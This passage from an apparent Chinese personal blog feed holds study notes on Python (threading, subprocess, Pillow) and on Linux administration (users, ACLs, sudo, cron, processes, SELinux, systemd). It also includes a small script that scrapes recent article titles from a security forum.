weeks、days、hours、minutes,seconds、milliseconds 和 microseconds</p><p>将 timedelta 对象返回传入 <code>str()</code> ,使人可读</p><p>利用<code>strftime()</code> 方法,可以将 datetime 对象显示为字符串</p><p>利用<code>datetime.datetime.strftime()</code>函数可以将字符串换成 datetime 对象</p><p><strong>多线程</strong></p><p><code>threading</code> 模块,可在单独的线程中执行延迟或安排的代码.</p><p>要得到单独的线程，首先要调用 <code>threading.Thread()</code>函数，生成一个<code>Thread 对象</code></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token keyword">import</span> time<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Start of program."</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">takeaNap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Wake up!'</span><span class="token punctuation">)</span>threadObj <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>takeaNap<span class="token punctuation">)</span>threadObj<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#调用时, takeaNap 在一个新线程中,主线程继续执行,当执行了time.sleep(5)后,打印结果,新线程结束</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'End of program'</span><span class="token punctuation">)</span>程序的输出<span class="token punctuation">:</span> Start of program<span class="token punctuation">.</span>End of programWake up!</code></pre><p><strong>常规参数可以作为一个列表，传递给 threading.Thread()中的 args 关键字参数</strong></p><p><strong>关键字参数可以作为一个字典，传递给 threading.Thread()中的 kwargs 关键字参数</strong></p><pre><code>&gt;&gt;&gt; import threading&gt;&gt;&gt; threadObj = threading.Thread(target=print, args=[&#39;cats&#39;, &#39;dogs&#39;, &#39;fogs&#39;],kwargs={&#39;sep&#39;: &#39;&amp;&#39;})&gt;&gt;&gt; threadObj.start() # 调用时会创建一个新线程来调用print()cats&amp;dogs&amp;fogs</code></pre><p><strong>用python启动其他程序</strong></p><p><code>subprocess</code> 模块中的<code>Popen() 函数</code> P 表示 process,进程.</p><p>每个进程可以有多个线程.</p><p>将要运行的 外部程序的文件名传递给<code>subprocess.Popen()</code> 函数.在Windows 中通过查看”属性”, 查看应用程序的文件名.</p><p>在 OS X上,Ctrl 键单击应用程序并选择”显示包尼尔” 找到可执行文件的路径</p><p><strong>运行其他 Python 脚本</strong></p><p>只需要向<code>Popen()</code> 传入 python.exe可执行文件,并将想运行的<code>.py</code> 文件名作为参数</p><h1 id="0x16-操作图像"><a href="#0x16-操作图像" class="headerlink" title="0x16    操作图像"></a>0x16    操作图像</h1><p> 模块<code>PIL</code>可以用于处理图像文件</p><p>计算机程序通常将图像中的颜色表示为 RGBA 值。RGBA 值是一组数字，指定顔色中的红、绿、蓝和 alpha（透明度）的值。这些值是从 0（根本没有）到 255（最高）的整数</p><p>Pillow 提供 <code>ImageColor.getcolor()</code>函数，所以你不必记住想用的顔色的 RGBA 值</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> ImageColor<span class="token keyword">print</span><span class="token punctuation">(</span>ImageColor<span class="token punctuation">.</span>getcolor<span class="token punctuation">(</span><span class="token string">'red'</span><span class="token punctuation">,</span> <span class="token string">'RGBA'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>打印结果<span class="token punctuation">:</span>     <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span></code></pre><p>Image 对象的 <code>crop()</code>方法接受一个矩形元组, 返回一个Image 对象,表示裁剪后的图像.</p><p><code>save()</code> 方法将裁剪后的图像 存入新文件中</p><p><code>copy()</code> 方法返回一个新的 Image 对象, 和原来的对象具有相同的图像.</p><p><code>resize()</code> 方法在Image 对象上调用.</p><p><code>rotate()</code> 方法选择图像,得到一个新的 Image 对象.</p><p><code>getpixel()</code> 和 <code>putpixel()</code> 方法可以得到单个像素</p><p>不想学后面的内容了,感觉用处不到,还不如花时间学 Python web.</p><p>我好菜啊!还这么废物/!/!!?!?!!!?!!?? dddd</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第一部分-Python编程基础&quot;&gt;&lt;a href=&quot;#第一部分-Python编程基础&quot; class=&quot;headerlink&quot; title=&quot;第一部分: Python编程基础&quot;&gt;&lt;/a&gt;第一部分: Python编程基础&lt;/h1&gt;&lt;h1 id=&quot;0x01-Python
      
    
    </summary>
    
    
      <category term="语言学习" scheme="https://hack-for.fun/categories/%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Python" scheme="https://hack-for.fun/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python 爬取先知论坛最近更新的文章</title>
    <link href="https://hack-for.fun/posts/20200208/"/>
    <id>https://hack-for.fun/posts/20200208/</id>
    <published>2020-02-08T12:26:42.001Z</published>
    <updated>2020-02-09T09:50:35.071Z</updated>
    
    <content type="html"><![CDATA[<p>用Python 爬取先知论坛最近更新的文章</p><p>直接上代码了,不多解释,大家都懂的,不过我这个Python小白还是花了好久才调出来了.</p><p>居然不知道可以在一个for循环遍历的时候,可以使用多个变量进行</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#! Python 3.7</span><span class="token comment" spellcheck="true"># author: IFONLY</span><span class="token comment" spellcheck="true"># 爬取先知最新10篇文章</span><span class="token comment" spellcheck="true">#import pyperclip, 因为暂时还不知道怎么解决在遍历时候复制被覆盖的问题,用列表存起来但是数据格式又不正确.</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> bs4<span class="token keyword">import</span> re<span class="token keyword">def</span> <span class="token function">webpy</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    resSoup <span class="token operator">=</span> bs4<span class="token punctuation">.</span>BeautifulSoup<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">,</span> <span class="token string">'html.parser'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 获取超链接</span>    data <span class="token operator">=</span> res<span class="token punctuation">.</span>text    link_list <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">"(/t/\d+)"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 如果要显示作者和日期的话,但是输出格式很丑</span>    <span class="token comment" spellcheck="true"># user_list = re.findall(r"(/u/\d+)", data)</span>    <span class="token comment" spellcheck="true"># 同时需要在遍历时加上第三个变量~</span>    <span class="token keyword">for</span> i<span class="token punctuation">,</span> link <span class="token keyword">in</span> zip<span class="token punctuation">(</span>range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>link_list<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        URL <span class="token operator">=</span> <span class="token string">"https://xz.aliyun.com"</span> <span class="token operator">+</span> link        titleSelect <span class="token operator">=</span> resSoup<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'.topic-title'</span><span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token comment" spellcheck="true">#userSelect = resSoup.select('.topic-info')[i]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>titleSelect<span class="token punctuation">.</span>text <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> URL<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">' '</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">'https://xz.aliyun.com/'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'先知论坛最近更新文章: '</span><span class="token punctuation">)</span>webpy<span class="token punctuation">(</span>url<span class="token punctuation">)</span></code></pre><p>程序运行的结果</p><hr><p>先知论坛最近更新文章: </p><p>​    对MYSQL注入相关内容及部分Trick的归类小结 <a href="https://xz.aliyun.com/t/7169" target="_blank" rel="noopener">https://xz.aliyun.com/t/7169</a><br>​    那些shellcode免杀总结 <a href="https://xz.aliyun.com/t/7170" target="_blank" rel="noopener">https://xz.aliyun.com/t/7170</a><br>​    Ripstech Java Security 2019 Calendar复现系列(二) <a href="https://xz.aliyun.com/t/7162" target="_blank" rel="noopener">https://xz.aliyun.com/t/7162</a><br>​    从一道CTF题初探NTRU格密码 <a href="https://xz.aliyun.com/t/7163" target="_blank" rel="noopener">https://xz.aliyun.com/t/7163</a><br>​    打造一个通用的信息推送框架 <a href="https://xz.aliyun.com/t/7165" target="_blank" rel="noopener">https://xz.aliyun.com/t/7165</a><br>​    如何利用AgentSmith-HIDS检测反弹shell <a href="https://xz.aliyun.com/t/7158" target="_blank" rel="noopener">https://xz.aliyun.com/t/7158</a><br>​    ysoserial URLDNS, CommonsCollections1-7 分析+复现 <a href="https://xz.aliyun.com/t/7157" target="_blank" rel="noopener">https://xz.aliyun.com/t/7157</a><br>​    智能合约审计系列————3、变量覆盖&amp;不一致性检查 <a href="https://xz.aliyun.com/t/7152" target="_blank" rel="noopener">https://xz.aliyun.com/t/7152</a><br>​    Webshell免杀研究 <a href="https://xz.aliyun.com/t/7151" target="_blank" rel="noopener">https://xz.aliyun.com/t/7151</a><br>​    Hitcon Traning Lab10做题笔记 —— UAF漏洞分析 <a href="https://xz.aliyun.com/t/7146" target="_blank" rel="noopener">https://xz.aliyun.com/t/7146</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;用Python 爬取先知论坛最近更新的文章&lt;/p&gt;
&lt;p&gt;直接上代码了,不多解释,大家都懂的,不过我这个Python小白还是花了好久才调出来了.&lt;/p&gt;
&lt;p&gt;居然不知道可以在一个for循环遍历的时候,可以使用多个变量进行&lt;/p&gt;
&lt;pre class=&quot; language
      
    
    </summary>
    
    
      <category term="语言学习" scheme="https://hack-for.fun/categories/%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Python" scheme="https://hack-for.fun/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Linux 操作系统学习笔记(下)</title>
    <link href="https://hack-for.fun/posts/20200204/"/>
    <id>https://hack-for.fun/posts/20200204/</id>
    <published>2020-02-04T06:42:49.110Z</published>
    <updated>2020-02-04T06:42:29.747Z</updated>
    
    <content type="html"><![CDATA[<p><strong>使用者识别码: UID (User ID)与 GID (Group ID)</strong></p><p>ID 与 账号的对应在<code>/etc/passwd</code> 当中</p><p><strong>/etc/passwd 文件结构</strong>, 每一行都代表一个账号,有几行就代表有几个账号在你的系统 .我的腾讯云中有21个账号,但是其中有很多是所谓的<strong>系统账号</strong>,就想 bin,nobody等.这些账号不能随便kill掉</p><p>有效群组与初始群组, groups, newgrp</p><p><img src="https://i.loli.net/2020/02/01/lUpj4FATx3ZwsR8.png" alt></p><p>查看所支持的群组使用<code>groups</code>命令.使用<code>newgrp</code>进行有效群组的切换</p><p>新增与移除使用者 <code>useradd</code> ,相关配置文件 <code>passwd, usermod, userdel</code> </p><blockquote><p>Linux 核心支持的账号可以高达232个.系统给予一个帐号 UID 时，他是 （1）先参考 UID_MIN 设置值取得最小数 值； 2）由 /etc/passwd 搜寻最大的 UID 数值， 将 （1） 与 （2） 相比，找出最大的那个再加一就是新帐号的 UID 了</p></blockquote><p><strong>使用者功能</strong></p><p><code>id</code> 查询某人或自己的相关UID/GID</p><p><code>finger</code> 有指纹的意思,他将使用者的相关属性列出来</p><p><code>chfn</code> change finger <code>chsh</code> change shell</p><p><strong>新增与移除群组</strong></p><p><code>groupadd</code> <code>groupmod</code> <code>groupdel</code> <code>gpasswd</code></p><hr><p><strong>windows</strong>下的身份验证系统,称为 <strong>Active Directory(AD)</strong> </p><p><strong>Linux 下 会使用到LDAP,NIS等服务器提供的身份验证</strong></p><blockquote><p><strong>主机的细部权限规划 :  ACL 的使用</strong></p></blockquote><ul><li>什么是ACL 与如何支持启动 ACL</li></ul><blockquote><p>ACL 是 Access Control List 的缩写，主要的目的是在提供传统的 owner,group,others 的 read,write,execute 权限之外的细部权限设置。ACL 可以针对单一使用者，单一文件或目录来进行 r,w,x 的权限规范，对于需要特殊权限的使用状况非常有帮助。</p></blockquote><ul><li>ACL 主要针对的方面的控制权限</li></ul><blockquote><p>使用者 （user）：可以针对使用者来设置权限； </p><p>群组 （group）：针对群组为对象来设置其权限； </p><p>默认属性 （mask）：还可以针对在该目录下在创建新文件/目录时，规范新数据的默认权限； </p></blockquote><ul><li>如何启动 ACL</li></ul><blockquote><p>原本 ACL 是 unix-like 操作系统的额外支持项目，但因为近年以来 Linux 系统对权限 细部设置的热切需求， 因此目前 ACL 几乎已经默认加入在所有常见的 Linux 文件系统的挂载 参数中 （ext2/ext3/ext4/xfs等等</p></blockquote><p>可以使用<code>dmesg</code> 这个命令来检查一下挂载</p><blockquote><p><strong>ACL 的设置技巧: getfacl, setfacl</strong></p></blockquote><p><code>getfacl</code> 取得某个文件/目录的ACL设置项目</p><p><code>setfacl</code> 设置某个目录/文件的ACL规范</p><p>使用默认权限设置目录未来文件的 ACL 权限继承“ d:[u|g]:[user|group]:权限 ” </p><p>特定的单一群组的权限设置：“ g:群组名:权限 ” </p><p>针对有效权限设置：“ m:权限 ” </p><hr><blockquote><p><strong>使用者身份切换</strong></p></blockquote><p>ssh是拒绝root登录的.为了系统安全,可以使用较低权限启动系统服务.</p><p><code>su</code> ,是最简单的身份切换指令,可以进行任何身份的切换</p><p><code>su [-lm] [-c指令] [username]</code> </p><ul><li>- ：单纯使用 - 如“ su - ”代表使用 login-shell 的变量文件读取方式来登陆系统</li><li>若使用者名称没有加上去，则代表切换为 root 的身份。 </li><li>-l ：与 - 类似，但后面需要加欲切换的使用者帐号！也是 login-shell 的方式</li><li>-m ：-m 与 -p 是一样的，表示“使用目前的环境设置，而不读取新使用者的配置文件” </li><li>-c ：仅进行一次指令，所以 -c 后面可以加上指令</li></ul><p><code>su</code>的用法总结</p><ul><li>若要完整的切换到新使用者的环境，必须要使用“ su - username ”或“ su -l username ”,才会连同PATH/USER/MAIL 等变量都转成新使用者的环境； </li><li>如果仅想要执行一次 root 的指令，可以利用“ su - -c “指令串” ”的方式来处理； </li><li>使用 root 切换成为任何使用者时，并不需要输入新使用者的密码；</li></ul><p><code>sudo</code> 因为su需要root的密码.,而sudo只需要自己的密码就行了,甚至不需要密码.sudo 可以以其他用户的身份来执行指令,通常是root.但是必须规范在<code>/etc/sudoers</code>内的用户才能执行sudo这个指令</p><p>我们可以使用<code>visudo</code> 来进行修改<code>/etc/sudoers</code> </p><p><code>ALL</code> 是特殊的关键字, 代表任何身份,主机,指令的意思</p><p>使用<code>sudo su -</code> 搭配使用,用户输入自己的密码后就变成了root的身份,并且root的密码不会外流,管理也比较方便</p><hr><blockquote><p>使用者的特殊 <strong>shell</strong> 与 <strong>PAM</strong> 模块</p></blockquote><p>系统账号的shell就是<code>/sbin/nologin</code> ,重点是系统账号不需要登录,所以给他的是这个无法登录的合法shell.</p><p>所谓的”无法登录”,即使用者无法使用bash或者shell来登录系统而已,并不是说这个账号不能使用其他的系统资源</p><p><strong>PAM(Pluggable Authentication Modules,嵌入式模块)</strong></p><p>PAM 可以说是一套应用程序接口 （Application Programming Interface, API），他提供了一连串的验证机制，只要使用者将验证阶段的需求告知 PAM 后， PAM 就能够回报使用者验证的结果 （成功或失败）。由于 PAM 仅是一套验证的机制，又可以提供给其他程序所调用引 用，因此不论你使用什么程序，都可以使用 PAM 来进行验证，如此一来，就能够让帐号密码或者是其他方式的验证具有一致的结果</p><p><img src="https://t1.picb.cc/uploads/2020/02/01/kWuqsy.png" alt></p><p>PAM 用来进行验证的数据称为模块(<strong>Modules</strong>),每个PAM模块的功能都不太相同</p><blockquote><p><strong>PAM 模块设置语法</strong></p></blockquote><p><img src="https://t1.picb.cc/uploads/2020/02/01/kWuQgN.png" alt></p><p><code>/var/log/secure</code> 或者 <code>/var/log/messages</code> 如果发生任何无法登录或者是产生一些无法预期的错误时,PAM模块都会讲数据记载到<code>/var/log/secure</code>中</p><p>查询使用者 <code>w</code> <code>who</code> <code>last</code> <code>lastlog</code></p><p>使用者对谈 <code>write</code> <code>mesg</code> <code>wall</code> </p><p><img src="https://i.loli.net/2020/02/01/qd7sAhG6juyHKL1.png" alt></p><h1 id="0x14-磁盘配额-Quota-与进阶文件系统管理"><a href="#0x14-磁盘配额-Quota-与进阶文件系统管理" class="headerlink" title="0x14    磁盘配额(Quota) 与进阶文件系统管理"></a>0x14    磁盘配额(Quota) 与进阶文件系统管理</h1><p><strong>学习目的: 了解</strong></p><p>quota 比较常使用的几个情况是： </p><ul><li>针对 WWW server ，例如：每个人的网页空间的容量限制！ </li><li>针对 mail server，例如：每个人的邮件空间限制。 </li><li>针对 file server，例如：每个人最大的可用网络硬盘空间 （教学环境中最常见</li></ul><p>软件自盘阵列(<strong>Software RAID</strong>)</p><p>磁盘阵列全名是“ Redundant Arrays of Inexpensive Disks, RAID ”,意思是：容错式廉价磁盘阵列.RAID通过一个技术,将多个较小的磁盘整合成为一个较大的磁盘设备.</p><p><strong>什么是 LVM,  PV, PE, VG LV的意义</strong></p><p>LVM 的全名是 Logical Volume Manager，中文可以翻译作逻辑卷轴管理员</p><p>Physical Volume, PV, 实体卷轴</p><p>Volume Group, VG, 卷轴群组</p><p>Physical Extent, PE, 实体范围区块 </p><p>Logical Volume, LV, 逻辑卷轴 </p><p><img src="https://t1.picb.cc/uploads/2020/02/01/kWuUdd.png" alt></p><h1 id="0x15-例行工作调度-crontab"><a href="#0x15-例行工作调度-crontab" class="headerlink" title="0x15    例行工作调度(crontab)"></a>0x15    例行工作调度(crontab)</h1><p>Linux 工作调度的种类 最小的时间单位是 <strong>分钟</strong></p><p><code>at</code>   </p><blockquote><p><code>at</code>是个可以处理<strong>仅执行一次就结束</strong>调度的指令,不过要执行<code>at</code>时,必须要有<code>atd</code>这个服务,在一些distribution中,atd可能默认没有开启.</p></blockquote><p><code>crontab</code></p><blockquote><p><code>crontab</code> 这个指令所设置的工作将会<strong>循环的一直进行</strong>下去.,处理使用指令执行之外,还可以通过编辑<code>/etc/crontab</code> 来支持,让crontab生效的服务是<code>crond</code> 服务</p></blockquote><pre><code>systemctl restart atd #重启 atd 服务systemctl enable atd # 让这个服务开机自启systemctl status atd # 查询 atd 目前的状态</code></pre><p><code>at</code>的运行方式</p><p>使用 at 这个指令来产生所要运行的工作，并将这个工作以文本文件的方式写入 /var/spool/at/ 目录内，该工作便能等待 atd 这个服务的取用与执行了</p><p>利用<code>/etc/at.allow</code> 和<code>/etc/at.deny</code> 这两个文件来进行<code>at</code>的使用权限. 如果不存在这两个文件,那么只有 root 可以使用 at这个指令</p><p>如果下达了<code>at</code>后,发现指令输入错误.可以利用<code>atq</code> 与 <code>atrm</code> 来将他移除. atq用于查询,atrm用于移除</p><p><code>batch</code> 在CPU 负载小于0.8的时候才进行下达的工作任务 </p><p><strong>工作负载的意思是： CPU 在单一时间点所负责的工作数量</strong>不是使用率</p><p><code>crontab</code> 的语法</p><ul><li>-u ：只有 root 才能进行这个任务，亦即帮其他使用者创建/移除 crontab 工作调度</li><li>-e ：编辑 crontab 的工作内容 </li><li>-l ：查阅 crontab 的工作内容 </li><li>-r ：移除所有的 crontab 的工作内容，若仅要移除一项，请用 -e 去编辑</li></ul><p>系统的配置文件<code>/etc/crontab</code> 和<code>/etc/cron.d/*</code></p><p>在 Linux 下面的 crontab 会自动的帮我们每分钟重新读取一次 /etc/crontab 的例行工作事项，但是某些原因或者是其他的 Unix 系统中，由于 crontab 是读到内存当中的，所以在你修改完 /etc/crontab 之后，可能并不会马上执行， 这个时候请重新启动 crond 这个服务</p><p><img src="https://i.loli.net/2020/02/02/nmEGfhA4kwbZvSt.png" alt></p><p>检测木马,很多的木马都是以命令的方式注入的,可以检查<code>var/log/cron</code>的内容</p><p><code>anacron</code> 是用来处理非24小时启动的Linux系统的crontab的执行.anacron 每个小时被 crond 执行一次然后 anacron 再去检测相关的调度任务有没有被执行，如果有超过期限的工作在， 就执行该调度任务，执行完毕或无须执行任何调度 时,anacron 就停止了</p><p><img src="https://t1.picb.cc/uploads/2020/02/02/kWCFag.png" alt="本章重点"></p><h1 id="0x16-程序管理与-SELinux-初探"><a href="#0x16-程序管理与-SELinux-初探" class="headerlink" title="0x16    程序管理与 SELinux 初探"></a>0x16    程序管理与 SELinux 初探</h1><p><strong>一个程序被载入到内存当中运行，那么在内存内的那个数据就被称为程序（process</strong></p><p>在Linux 系统当中：“触发任何一个事件时，系统都会将他定义成为一个程序，并且给予这个程序一个 ID ，称为 PID，同时依据启发这个程序的使用者与相关属性关系，给予这个 PID 一组有效的权限设置</p><p><code>fork and exec</code> 程序调用的流程</p><p>程序都会借由父程序以复制 （fork)的方式产生一个一模一样的子程序， 然后被复制出来的子程序再以 exec 的方式来执行实际要进行的程序，最终就成为一个子程序的存在</p><p><img src="https://i.loli.net/2020/02/02/SnC4uNW7Gyt2F1w.png" alt></p><blockquote><p>系统或网络服务: 常驻内存的程序</p></blockquote><p>常驻在内存当中的程序通常都是负责一些系统所提供的功能以服务使用者各项任务，因此这些常驻程序就会被我们称为：服务 （<strong>daemon</strong>）.<strong>一般 daemon 类型的程序都会加上 d在文件名后面</strong></p><p>bash 环境下的工作管理(<strong>job control</strong>)</p><p>直接将指令丢到背景中”执行”的 <code>&amp;</code>,不能被 Ctrl+c 中断</p><p>观察目前的背景工作状态 <code>jobs</code> </p><p>将背景工作拿到前景来处理<code>fg</code></p><p>让工作在背景下的状态变成运行中<code>bg</code></p><p>管理背景当中的工作<code>kill</code></p><p>-l ：这个是 L 的小写，列出目前 kill 能够使用的讯号 （signal） 有哪些？ signal ：代表给予后面接的那个工作什么样的指示啰！用 man 7 signal 可知： </p><ul><li>​    -1 ：重新读取一次参数的配置文件 （类似 reload）； </li><li>​    -2 ：代表与由键盘输入 [ctrl]-c 同样的动作； </li><li>​    -9 ：立刻强制删除一个工作； </li><li>​    -15：以正常的程序方式终止一项工作。与 -9 是不一样的</li></ul><p>kill 后面默认接的数字是 PID, 如果要管理 bash的工作控制,就得要加上%数字</p><p><code>nohup</code>指令可以让工作在离线或者登出系统后继续进行</p><p>静态程序观察<code>ps</code> 动态 <code>top</code></p><p><code>ps</code></p><ul><li>-A ：所有的 process 均显示出来，与 -e 具有同样的效用； </li><li>-a ：不与 terminal 有关的所有 process ； </li><li>-u ：有效使用者 （effective user） 相关的 process ； </li><li>x ：通常与 a 这个参数一起使用，可列出较完整信息。 </li><li>输出格式规划： </li><li>l ：较长、较详细的将该 PID 的的信息列出； </li><li>j ：工作的格式 （jobs format） </li><li>-f ：做一个更为完整的输出。 </li></ul><p><code>top</code></p><p>-d ：后面可以接秒数，就是整个程序画面更新的秒数。默认是 5 秒； </p><p>-b ：以批次的方式执行 top ，还有更多的参数可以使用喔！ </p><p>通常会搭配数据流重导向来将批次的结果输出成为文件。 </p><p>-n ：与 -b 搭配，意义是，需要进行几次 top 的输出结果。 </p><p>-p ：指定某些个 PID 来进行观察监测而已。 </p><p>在 top 执行过程当中可以使用的按键指令： </p><p>? ：显示在 top 当中可以输入的按键指令； </p><p>P ：以 CPU 的使用资源排序显示； </p><p>M ：以 Memory 的使用资源排序显示； </p><p>N ：以 PID 来排序喔！ </p><p>T ：由该 Process 使用的 CPU 时间累积 （TIME+） 排序。 </p><p>k ：给予某个 PID 一个讯号 （signal） </p><p>r ：给予某个 PID 重新制订一个 nice 值。 </p><p>q ：离开 top 软件的按键。 </p><p>观察系统所有程序 <code>ps aux</code></p><p>查找程序之间的相关性 <code>pstree</code></p><p><img src="https://i.loli.net/2020/02/02/MWNX1ISROihtLeZ.png" alt></p><p><code>killall -signal 指令名称</code></p><ul><li>-i ：interactive 的意思，互动式的，若需要删除时，会出现提示字符给使用者； </li><li>-e ：exact 的意思，表示“后面接的 command name 要一致”，但整个完整的指令 </li><li>不能超过 15 个字符。 </li><li>-I ：指令名称（可能含参数）忽略大小写。 </li></ul><p>程序的优先执行序(Priority) 与 CPU 调度</p><p><img src="https://i.loli.net/2020/02/02/6j7PbBOrAJNCpxn.png" alt></p><p>Liunx 给予程序一个所谓的”优先执行序”(priority,PRI),值越低表示越优先的意思,这个<strong>PRI的值是由核心动态调整的.</strong>如果想要调整程序的优先执行序时,可以通过Nice的值.</p><p><code>PRI(new) = PRI(old) + nice</code></p><p>nice 的值可调整的范围为<code>-20~19</code> ,root 可以随意调整自己或者他人程序的Nice值.一般使用者只能调整自己的Nice值,且范围为<code>0~19</code>,并且<strong>只能越调越高</strong></p><p><code>renice</code> 已存在程序的 nice 重新调整</p><hr><p>系统资源的观察</p><p><code>free</code> 观察内存使用情况</p><p>Linux 系统为了加速系统性能,所以会将最常使用到的或者最近使用到的文件数据高速缓存(<strong>cache</strong>)下来,下次系统使用该文件时,直接从内存中搜寻取出,而不需要重新读取硬盘</p><p><code>uname</code> 查询系统与核心相关信息</p><ul><li>-a ：所有系统相关的信息，包括下面的数据都会被列出来； </li><li>-s ：系统核心名称 </li><li>-r ：核心的版本 </li><li>-m ：本系统的硬件名称，例如 i686 或 x86_64 等； </li><li>-p ：CPU 的类型，与 -m 类似，只是显示的是 CPU 的类型！ </li><li>-i ：硬件的平台 （ix86） </li></ul><p><code>uptime</code> 观察系统启动时间与工作负载</p><p><code>netstat</code> 追踪网络或插槽档</p><ul><li>-a ：将目前系统上所有的连线、监听、Socket 数据都列出来 </li><li>-t ：列出 tcp 网络封包的数据 </li><li>-u ：列出 udp 网络封包的数据 </li><li>-n ：不以程序的服务名称，以埠号 （port number） 来显示； </li><li>-l ：列出目前正在网络监听 （listen） 的服务； </li><li>-p ：列出该网络服务的程序 PID</li></ul><p><code>socket file</code> 可以沟通两个程序之间的信息</p><p><code>dmesg</code> 分析核心产生的信息</p><p><code>vmstat</code> 侦测系统资源变化</p><p>-a ：使用 inactive/active（活跃与否） 取代 buffer/cache 的内存输出信息； </p><p>-f ：开机到目前为止，系统复制 （fork） 的程序数； </p><p>-s ：将一些事件 （开机至目前为止） 导致的内存变化情况列表说明； </p><p>-S ：后面可以接单位，让显示的数据有单位。例如 K/M 取代 Bytes 的容量； </p><p>-d ：列出磁盘的读写总量统计表 </p><p>-p ：后面列出分区，可显示该分区的读写总量统计表 </p><p><code>/proc/*</code>  代表的意义</p><p><img src="https://i.loli.net/2020/02/02/58eqaS6xMrkZJPD.png" alt></p><p>查询已经打开文件或已执行程序打开的文件</p><p><code>fuser</code> 借助文件或文件系统找出正在使用该文件的程序</p><p>-u ：除了程序的 PID 之外，同时列出该程序的拥有者； </p><p>-m ：后面接的那个文件名会主动的上提到该文件系统的最顶层，对 umount 不成功很有效！ </p><p>-v ：可以列出每个文件与程序还有指令的完整相关性！ </p><p>-k ：找出使用该文件/目录的 PID ，并试图以 SIGKILL 这个讯号给予该 PID； </p><p>-i ：必须与 -k 配合，在删除 PID 之前会先询问使用者意愿！ </p><p>-signal：例如 -1 -15 等等，若不加的话，默认是 SIGKILL （-9）</p><p><code>lsof</code> 列出被程序所打开的文件文件名</p><p><code>pidof</code> 找出某支正在执行的程序 PID </p><hr><p>SELinux(Security Enhanced Linux ),安全强化的Linux</p><p>传统的文件权限与账户关系: 自主式存取控制,DAC</p><p>当某个程序想要对文件进行存取时， 系统就会根据该程序的拥有者/群组，并比对文件的权限，若通过权限检查，就可以存取该文件了。这种存取文件系统的方式被称为“自主式存取控制 （<strong>Discretionary Access Control</strong>, DAC）</p><p>以政策规则订定特定程序读取特定文件：委任式存取控制, MAC . 针对特定的程序与特定的文件资源来进行权限的控管</p><p><img src="https://i.loli.net/2020/02/02/UghcdJ2IkvVRYW7.png" alt></p><p>SELinux 有 <code>enforcing</code> <code>permissive</code> <code>disabled</code> 三种模式表示强制,宽容,和关闭.</p><p>使用<code>sestatus</code> 指令来观察 SELinux的政策</p><p><img src="https://i.loli.net/2020/02/02/unEvq1AfMj79W43.png" alt="本章重点"></p><h1 id="0x17-认识系统服务-daemons"><a href="#0x17-认识系统服务-daemons" class="headerlink" title="0x17    认识系统服务( daemons )"></a>0x17    认识系统服务( daemons )</h1><p><code>systemd</code>常驻内存</p><p>如果某个服务启动是管理员自己手动执行启动，而不是使用 systemctl 去启动的 （例如你自己手动输入 crond 以启动 crond 服务），那么 systemd 将无法侦测到该服务，而无 法进一步管理</p><p>基本上， systemd 将过去所谓的 daemon 执行脚本通通称为一个服务单位 （unit），而每种服务单位依据功能来区分时，就分类为不同的类型 （type）。 基本的类型有包括系统服务、数据监听与交换的插槽档服务 （socket）、储存系统状态的快照类型、提供不同类似执行等级分类的操作环境 （target） 等等</p><p>这些功能的配置文件都在这些目录当中</p><ul><li>/usr/lib/systemd/system/：每个服务最主要的启动脚本设置，有点类似以前的 /etc/init.d </li><li>下面的文件； </li><li>/run/systemd/system/：系统执行过程中所产生的服务脚本，这些脚本的优先序要比 </li><li>/usr/lib/systemd/system/ 高！ </li><li>/etc/systemd/system/：管理员依据主机系统的需求所创建的执行脚本，其实这个目录有 </li><li>点像以前 /etc/rc.d/rc5.d/Sxx 之类的功能！执行优先序又比 /run/systemd/system/ 高</li></ul><p>到底系统开机会不会执行某些服务其实是看 <code>/etc/systemd/system/</code>下面的设置，所 